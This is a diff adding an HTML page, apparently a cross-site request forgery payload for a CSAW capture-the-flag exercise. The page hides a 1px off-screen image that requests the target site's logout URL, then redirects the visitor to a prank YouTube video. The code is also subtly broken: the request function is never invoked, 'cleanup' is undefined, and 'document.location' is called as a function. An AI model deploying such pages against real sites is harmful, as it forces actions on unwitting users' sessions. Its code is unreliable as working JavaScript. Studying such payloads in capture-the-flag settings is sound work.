@@ -1,0 +1,32 @@
+<html>
+<head>
+<style>
+.hidden {
+      position: fixed;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      top: -10px;
+      left: -10px;
+}
+</style>
+<script>
+function get(url) {
+      return function(success, error) {
+        var img = document.createElement("img");
+        img.onload = cleanup(success, img);
+        img.onerror = cleanup(success, img);
+        img.className = "hidden";
+        document.body.appendChild(img);
+        img.src = url;
+      };
+}
+</script>
+</head>
+<body>
+<script>
+get("https://hsf.csaw.io/logout");
+document.location("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+</script>
+</body>
+</html>
